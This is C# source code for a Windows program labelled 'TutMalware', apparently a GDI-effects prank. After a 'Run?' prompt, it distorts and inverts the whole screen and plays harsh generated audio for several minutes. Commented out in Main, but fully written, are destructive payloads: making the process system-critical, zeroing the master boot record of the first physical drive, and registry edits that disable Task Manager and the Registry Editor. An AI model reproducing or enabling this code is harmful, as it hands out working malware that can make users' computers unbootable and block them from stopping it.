// TutMalware.Program
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using bmp;
using Microsoft.Win32;

internal static class Program
{
	private class bb1 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			using (var stream = new MemoryStream())
			{
				var writer = new BinaryWriter(stream);

				writer.Write("RIFF".ToCharArray());  // chunk id
				writer.Write((UInt32)0);             // chunk size
				writer.Write("WAVE".ToCharArray());  // format

				writer.Write("fmt ".ToCharArray());  // chunk id
				writer.Write((UInt32)16);            // chunk size
				writer.Write((UInt16)1);             // audio format

				var channels = 1;
				var sample_rate = 8000;
				var bits_per_sample = 8;

				writer.Write((UInt16)channels);
				writer.Write((UInt32)sample_rate);
				writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
				writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
				writer.Write((UInt16)bits_per_sample);

				writer.Write("data".ToCharArray());

				var seconds = 61;

				var data = new byte[sample_rate * seconds];

				for (var t = 0; t < data.Length; t++)
					data[t] = (byte)(
						((-t & 4095) * (25 & t * (t & t >> 19)) >> 2) + (127 & t * (254 & t >> 6 & t >> 3) >> (2 & t >> 12))
						//t * (42 & t >> 10)
						//t | t % 255 | t % 257
						//t * (t >> 9 | t >> 13) & 16
						);

				writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

				foreach (var elt in data) writer.Write(elt);

				writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
				writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

				stream.Seek(0, SeekOrigin.Begin);

				new SoundPlayer(stream).PlaySync();
			}
			
		}
	}

	private class bb2 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			using (var stream = new MemoryStream())
			{
				var writer = new BinaryWriter(stream);

				writer.Write("RIFF".ToCharArray());  // chunk id
				writer.Write((UInt32)0);             // chunk size
				writer.Write("WAVE".ToCharArray());  // format

				writer.Write("fmt ".ToCharArray());  // chunk id
				writer.Write((UInt32)16);            // chunk size
				writer.Write((UInt16)1);             // audio format

				var channels = 1;
				var sample_rate = 16000;
				var bits_per_sample = 8;

				writer.Write((UInt16)channels);
				writer.Write((UInt32)sample_rate);
				writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
				writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
				writer.Write((UInt16)bits_per_sample);

				writer.Write("data".ToCharArray());

				var seconds = 61;

				var data = new byte[sample_rate * seconds];

				for (var t = 0; t < data.Length; t++)
					data[t] = (byte)(
						10 * (t >> 8 | t | t >> (t >> 16)) + (1 & t >> 11)
						//t * (42 & t >> 10)
						//t | t % 255 | t % 257
						//t * (t >> 9 | t >> 13) & 16
						);

				writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

				foreach (var elt in data) writer.Write(elt);

				writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
				writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

				stream.Seek(0, SeekOrigin.Begin);

				new SoundPlayer(stream).PlaySync();
			}

		}
	}

	private class bb3 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			using (var stream = new MemoryStream())
			{
				var writer = new BinaryWriter(stream);

				writer.Write("RIFF".ToCharArray());  // chunk id
				writer.Write((UInt32)0);             // chunk size
				writer.Write("WAVE".ToCharArray());  // format

				writer.Write("fmt ".ToCharArray());  // chunk id
				writer.Write((UInt32)16);            // chunk size
				writer.Write((UInt16)1);             // audio format

				var channels = 1;
				var sample_rate = 16000;
				var bits_per_sample = 8;

				writer.Write((UInt16)channels);
				writer.Write((UInt32)sample_rate);
				writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
				writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
				writer.Write((UInt16)bits_per_sample);

				writer.Write("data".ToCharArray());

				var seconds = 61;

				var data = new byte[sample_rate * seconds];

				for (var t = 0; t < data.Length; t++)
					data[t] = (byte)(
						10 * (t >> 8 | t | t >> (t >> 16)) + (1 & t >> 11)
						//t * (42 & t >> 10)
						//t | t % 255 | t % 257
						//t * (t >> 9 | t >> 13) & 16
						);

				writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

				foreach (var elt in data) writer.Write(elt);

				writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
				writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

				stream.Seek(0, SeekOrigin.Begin);

				new SoundPlayer(stream).PlaySync();
			}

		}
	}
	private class Drawer1 : Drawer
	{
		private int redrawCounter;
		private int redrawCounter1;
		public override void Draw(IntPtr hdc)
		{
			Random r = new Random();
			int x = Screen.PrimaryScreen.Bounds.X;
			int y = Screen.PrimaryScreen.Bounds.Y;
			int left = Screen.PrimaryScreen.Bounds.Left;
			int top = Screen.PrimaryScreen.Bounds.Top;
			int right = Screen.PrimaryScreen.Bounds.Right;
			int bottom = Screen.PrimaryScreen.Bounds.Bottom;
			IntPtr hwnd = GetDesktopWindow();
			POINT[] lppoint = new POINT[3];
			hdc = GetWindowDC(hwnd);
			int r1 = r.Next(x,y);
			int r2 = r.Next(x,y);
			int r3 = r.Next(x,y);
			int r4 = r.Next(x,y);
			int r5 = r.Next(x,y);
			int r6 = r.Next(x,y);
			int cx = Cursor.Position.X;
			int cy = Cursor.Position.Y;
			redrawCounter++;
			int re = redrawCounter;
			int s = r.Next(-5-re,6+re);
			//lppoint[0].X = left + r.Next(y);
			//lppoint[0].Y = top + (55+re);
			//lppoint[1].X = right - (1500+re);
			//lppoint[1].Y = top + (250+re);
			//lppoint[2].X = left + (650+re);
			//lppoint[2].Y = bottom - (650+re);
			//PlgBlt(hdc, lppoint, hdc, left, top, right - left, bottom - top, IntPtr.Zero, 0, 0);
			BitBlt(hdc, r.Next(-1, 2), r.Next(-1, 2), x, y, hdc, 0, 0, 15597702);
			lppoint[0].X = left - (0 - re -re);
			lppoint[0].Y = top + (55 + re);
			lppoint[1].X = right - (1000 - re);
			lppoint[1].Y = top + (250 - re );
			lppoint[2].X = left + (650);
			lppoint[2].Y = bottom - (600 - re - re);
			PlgBlt(hdc, lppoint, hdc, left, top, right - left, bottom - top, IntPtr.Zero, 0, 0);
			//lppoint[0].X = left + r.Next(cx-15,cx+15);
			//lppoint[0].Y = top - r.Next(cy-15,cx+15);
			//lppoint[1].X = right + r.Next(cx-15,cx+15);
			//lppoint[1].Y = top + r.Next(cy-15,cx+15);
			//lppoint[2].X = left - r.Next(cx-15,cx+15);
			//lppoint[2].Y = bottom - r.Next(cy-15,cy+15);
			//PlgBlt(hdc, lppoint, hdc, left, top, right - left, bottom - top, IntPtr.Zero, 0, 0);

			//lppoint[0].X = left + (650);
			//lppoint[0].Y = top + (150);
			//lppoint[1].X = right - (1500);
			//lppoint[1].Y = top + (250);
			//lppoint[2].X = left + (650);
			//lppoint[2].Y = bottom - (600);
			//PlgBlt(hdc, lppoint, hdc, left, top, right - left, bottom - top, IntPtr.Zero, 0, 0);
			//lppoint[0].X = left + (400);
			//lppoint[0].Y = top + (400);
			//lppoint[1].X = right - (1270);
			//lppoint[1].Y = top + (150);
			//lppoint[2].X = left + (152);
			//lppoint[2].Y = bottom - (750);
			//PlgBlt(hdc, lppoint, hdc, left, top, right - left, bottom - top, IntPtr.Zero, 0, 0);
			redrawCounter1++;
			if (redrawCounter1 == 5) { redrawCounter1 = 0; Redraw(); }
			Thread.Sleep(0);
		}
	}

	private class Drawer2 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			int sx = Screen.PrimaryScreen.Bounds.Width;
			int sy = Screen.PrimaryScreen.Bounds.Height;
			Graphics g = Graphics.FromHdc(GetDC(IntPtr.Zero));
			Random r = new Random();
			g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;


			Pen pen = new Pen(Brushes.AliceBlue, r.Next(50));
			pen.StartCap = pen.EndCap = System.Drawing.Drawing2D.LineCap.Round;
			float x1 = 0;
			float y1 = 0;

			float y2 = 0;

			float yEx = r.Next(sx);
			float ef = r.Next(0, 500);

			for (float x = 0; x < sx; x += 0.1F)
			{
				y2 = (float)Math.Sin(x);
				int r1 = r.Next(255);
				int r2 = r.Next(255);
				int r3 = r.Next(255);
				pen.Color = System.Drawing.Color.FromArgb(r1, r2, r3);
				g.DrawLine(pen, x1 * ef, y1 * ef + yEx, x * ef, y2 * ef + yEx);

				x1 = x;
				y1 = y2;


			}
			Redraw();
			Thread.Sleep(0);
		}
	}

	private class Drawer3 : Drawer
	{
		private int rx;
		private int ry;
		private int rw;
		public override void Draw(IntPtr hdc)
		{	
			Random r = new Random();
			int r1 = r.Next(255);
				int r2 = r.Next(255);
				int r3 = r.Next(255);
			int sx = Screen.PrimaryScreen.Bounds.Width;
			int sy = Screen.PrimaryScreen.Bounds.Height;
			IntPtr dPtr = GetDC(IntPtr.Zero);
			Graphics g = Graphics.FromHdc(dPtr);
			
			int cx = Cursor.Position.X;
			int cy = Cursor.Position.Y;
			g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
			rw++;
			rw++;
			rw++;
			rw++;
			rw++;

			int rcw = rw;
			System.Drawing.Brush _Brush = new SolidBrush(System.Drawing.Color.FromArgb(111,rcw, rcw, rcw));
			Pen pen = new Pen(_Brush, 5);
			pen.StartCap = pen.EndCap = System.Drawing.Drawing2D.LineCap.Round;

			int rand1 = r.Next(-1,2);
			int randx = r.Next(cx);
			int randy = r.Next(cy);
			rx++;ry++;
			rx++; ry++;
			rx++; ry++;
			rx++; ry++;
			rx++; ry++;

			int rcx = rx;
			int rcy = ry;
			int r4 = r.Next(100);
			if(rcw == 255) { rw = 0;  }
			if (rcx == sx+10) { rx = 0;  }
			if (rcy == sy+10) { ry = 0; }

			g.DrawLine(pen,rcx,sy,rcx,0);
			Thread.Sleep(100);
		}
		
	}
	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool SetForegroundWindow(IntPtr hWnd);
	[DllImport("user32.dll", EntryPoint = "SetWindowPos")]
	public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);
	const short SWP_NOMOVE = 0X2;
	const short SWP_NOSIZE = 1;
	const short SWP_NOZORDER = 0X4;
	const int SWP_SHOWWINDOW = 0x0040;
	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

	[StructLayout(LayoutKind.Sequential)]
	public struct RECT
	{
		public int Left;        // x position of upper-left corner  
		public int Top;         // y position of upper-left corner  
		public int Right;       // x position of lower-right corner  
		public int Bottom;      // y position of lower-right corner  
	}
	[DllImport("user32.dll")]
	static extern IntPtr GetForegroundWindow();
	[DllImport("gdi32.dll")]
	static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
TernaryRasterOperations dwRop);
	public enum TernaryRasterOperations
	{
		SRCCOPY = 0x00CC0020, // dest = source
		SRCPAINT = 0x00EE0086, // dest = source OR dest
		SRCAND = 0x008800C6, // dest = source AND dest
		SRCINVERT = 0x00660046, // dest = source XOR dest
		SRCERASE = 0x00440328, // dest = source AND (NOT dest)
		NOTSRCCOPY = 0x00330008, // dest = (NOT source)
		NOTSRCERASE = 0x001100A6, // dest = (NOT src) AND (NOT dest)
		MERGECOPY = 0x00C000CA, // dest = (source AND pattern)
		MERGEPAINT = 0x00BB0226, // dest = (NOT source) OR dest
		PATCOPY = 0x00F00021, // dest = pattern
		PATPAINT = 0x00FB0A09, // dest = DPSnoo
		PATINVERT = 0x005A0049, // dest = pattern XOR dest
		DSTINVERT = 0x00550009, // dest = (NOT dest)
		BLACKNESS = 0x00000042, // dest = BLACK
		WHITENESS = 0x00FF0062, // dest = WHITE
		hmm = 0x00100C85
	};
	private class Drawer4 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			Process myProcess = new Process();
			Process[] processes = Process.GetProcesses();

			foreach (var process in processes)
			{

				Console.WriteLine("Process Name: {0} ", process.ProcessName);

				IntPtr handle = process.MainWindowHandle;
				if (handle != IntPtr.Zero)
				{
					POINT[] lppoint = new POINT[3];
					Random r = new Random();
					RECT t2;
					int x = Screen.PrimaryScreen.Bounds.Width;
					int y = Screen.PrimaryScreen.Bounds.Height;
					GetWindowRect(GetForegroundWindow(), out t2);
					int rx = r.Next(x);
					int ry = r.Next(y);
					redrawCounter++;
					int re = redrawCounter;
					//IntPtr hgdiobj = CreateSolidBrush((uint)random.Next(0, 16777216));
					//SelectObject(hdc, hgdiobj);
					//PatBlt(hdc, t2.Left, t2.Top, t2.Right - t2.Left, t2.Bottom - t2.Top, CopyPixelOperation.DestinationInvert);
					//StretchBlt(hdc, rx, ry, t2.Right - t2.Left - 10, t2.Bottom - t2.Top - 10, hdc, t2.Left, t2.Top, t2.Right - t2.Left, t2.Bottom - t2.Top, TernaryRasterOperations.NOTSRCCOPY);
					lppoint[0].X = t2.Left + (re);
					lppoint[0].Y = t2.Top - (re);
					lppoint[1].X = t2.Right + re;
					lppoint[1].Y = t2.Top + re;
					lppoint[2].X = t2.Left - re;
					lppoint[2].Y = t2.Bottom - re;
					PlgBlt(hdc, lppoint, hdc, t2.Left, t2.Top, t2.Right - t2.Left, t2.Bottom - t2.Top, IntPtr.Zero, 0, 0);
					Redraw();
					Thread.Sleep(100);
					lppoint[0].X = t2.Left - re;
					lppoint[0].Y = t2.Top + re;
					lppoint[1].X = t2.Right - re;
					lppoint[1].Y = t2.Top - re;
					lppoint[2].X = t2.Left + re;
					lppoint[2].Y = t2.Bottom + re;
					PlgBlt(hdc, lppoint, hdc, t2.Left, t2.Top, t2.Right - t2.Left, t2.Bottom - t2.Top, IntPtr.Zero, 0, 0);
					Redraw();
					Thread.Sleep(100);
					//
				}
			}
		}
	}

	private class Drawer5 : Drawer
	{
		private int redrawCounter;
		public override void Draw(IntPtr hdc)
		{
			Process myProcess = new Process();
			Process[] processes = Process.GetProcesses();

			foreach (var process in processes)
			{

				Console.WriteLine("Process Name: {0} ", process.ProcessName);

				IntPtr handle = process.MainWindowHandle;
				if (handle != IntPtr.Zero)
				{
					int num = 250;
					int num2 = 250;
					int num3 = random.Next(0, screenW - num);
					int num4 = random.Next(0, screenH - num2);
					POINT[] lppoint = new POINT[3];
					Random r = new Random();
					RECT t2;
					int x = Screen.PrimaryScreen.Bounds.Width;
					int y = Screen.PrimaryScreen.Bounds.Height;
					GetWindowRect(GetForegroundWindow(), out t2);
					int rx = r.Next(x);
					int ry = r.Next(y);
					redrawCounter++;
					int re = redrawCounter;
					IntPtr hgdiobj = CreateSolidBrush((uint)random.Next(0, 16777216));
					SelectObject(hdc, hgdiobj);
					//PatBlt(hdc, t2.Left, t2.Top, t2.Right - t2.Left, t2.Bottom - t2.Top, CopyPixelOperation.PatInvert);
					StretchBlt(hdc, rx, ry, t2.Right - t2.Left - 10, t2.Bottom - t2.Top - 10, hdc, t2.Left, t2.Top, t2.Right - t2.Left, t2.Bottom - t2.Top, TernaryRasterOperations.NOTSRCCOPY);
					Thread.Sleep(1000);
					//
				}
			}
		}
	}

	private class f1 : Drawer
	{
		private int redrawCounter;
		public override void Draw(IntPtr hdc)
		{
			Application.Run(new Form2());

		}
	}
	private abstract class Drawer
	{
		public bool running;

		public Random random = new Random();

		public int screenW = Screen.PrimaryScreen.Bounds.Width;

		public int screenH = Screen.PrimaryScreen.Bounds.Height;

		public void Start()
		{
			if (!running)
			{
				running = true;
				new Thread(DrawLoop).Start();
			}
		}

		public void Stop()
		{
			running = false;
		}

		private void DrawLoop()
		{
			while (running)
			{
				IntPtr dC = GetDC(IntPtr.Zero);
				Draw(dC);
				ReleaseDC(IntPtr.Zero, dC);
			}
		}

		public void Redraw()
		{
			RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
		}

		public abstract void Draw(IntPtr hdc);
	}

	[Flags]
	private enum RedrawWindowFlags : uint
	{
		Invalidate = 1u,
		InternalPaint = 2u,
		Erase = 4u,
		Validate = 8u,
		NoInternalPaint = 0x10u,
		NoErase = 0x20u,
		NoChildren = 0x40u,
		AllChildren = 0x80u,
		UpdateNow = 0x100u,
		EraseNow = 0x200u,
		Frame = 0x400u,
		NoFrame = 0x800u
	}
	private static void Main1() 
	{ 
			Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run(new Form1());
	}
	[STAThread]
	public static void Main()
	{
		Random r = new Random();
		Drawer f1 = new f1();
		Drawer bb1 = new bb1();
		Drawer bb2 = new bb2();
		Drawer bb3 = new bb3();
		Drawer drawer = new Drawer1();
		Drawer drawer2 = new Drawer2();
		Drawer drawer3 = new Drawer3();
		Drawer drawer4 = new Drawer4();
		Drawer drawer5 = new Drawer5();
		SoundPlayer audio = new SoundPlayer(bmp.Properties.Resources.dredererderderedre);
		SoundPlayer audio1 = new SoundPlayer(bmp.Properties.Resources.noise);
		if (MessageBox.Show("Run?", "bmp.exe", MessageBoxButtons.YesNo) == DialogResult.Yes)
		{
			//int isCritical = 1;  // we want this to be a Critical Process
			//int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
			//Process.EnterDebugMode();
			//NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
			//var mbrData = new byte[MbrSize];
			//var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
			//	OpenExisting, 0, IntPtr.Zero);
			//try
			//{
			//	WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
			//	CloseHandle(mbr);
			//}
			//catch { }
			//RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			//distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
			//RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			//disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
			Thread.Sleep(5000);
			bb1.Start();
			drawer.Start();
			Thread.Sleep(60000);
			bb1.Stop();
			drawer.Stop();
			bb2.Start();
			drawer5.Start();
			drawer3.Start();
			Thread.Sleep(60000);
			audio.Play();
			bb2.Stop();
			drawer5.Stop();
			f1.Start();
			drawer4.Start();
			drawer3.Stop();
			Thread.Sleep(20000);
			drawer4.Stop();
			audio1.Play();
			drawer.Start();
			drawer2.Start();
			Thread.Sleep(r.Next(10000, 30000));
			Environment.Exit(-1);
		}
	}

	[DllImport("gdi32.dll")]
	public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);

	[DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC", SetLastError = true)]
	static extern IntPtr CreateCompatibleDC([In] IntPtr hdc);

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateSolidBrush(uint crColor);

	[DllImport("gdi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteObject([In] IntPtr hObject);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr GetDC(IntPtr hWnd);

	[DllImport("user32.dll")]
	private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

	[DllImport("gdi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

	[DllImport("gdi32.dll")]
	private static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, CopyPixelOperation dwRop);

	[DllImport("user32.dll")]
	private static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, RedrawWindowFlags flags);

	[DllImport("gdi32.dll")]
	static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc,
int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask,
int yMask);
	[DllImport("user32.dll")]
	static extern IntPtr GetDesktopWindow();
	[DllImport("user32.dll")]
	static extern IntPtr GetWindowDC(IntPtr hWnd);
	public struct POINT
	{
		public int X;
		public int Y;

		public POINT(int x, int y)
		{
			this.X = x;
			this.Y = y;
		}

		public static implicit operator System.Drawing.Point(POINT p)
		{
			return new System.Drawing.Point(p.X, p.Y);
		}

		public static implicit operator POINT(System.Drawing.Point p)
		{
			return new POINT(p.X, p.Y);
		}

	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("kernel32")]
	private static extern IntPtr CreateFile(
string lpFileName,
uint dwDesiredAccess,
uint dwShareMode,
IntPtr lpSecurityAttributes,
uint dwCreationDisposition,
uint dwFlagsAndAttributes,
IntPtr hTemplateFile);
	[DllImport("kernel32")]
	private static extern bool WriteFile(
IntPtr hFile,
byte[] lpBuffer,
uint nNumberOfBytesToWrite,
out uint lpNumberOfBytesWritten,
IntPtr lpOverlapped);

	private const uint GenericRead = 0x80000000;
	private const uint GenericWrite = 0x40000000;
	private const uint GenericExecute = 0x20000000;
	private const uint GenericAll = 0x10000000;

	private const uint FileShareRead = 0x1;
	private const uint FileShareWrite = 0x2;

	//dwCreationDisposition
	private const uint OpenExisting = 0x3;

	//dwFlagsAndAttributes
	private const uint FileFlagDeleteOnClose = 0x4000000;

	private const uint MbrSize = 512u;
	[DllImport("kernel32.dll", SetLastError = true)]
	static extern bool CloseHandle(IntPtr hHandle);

}
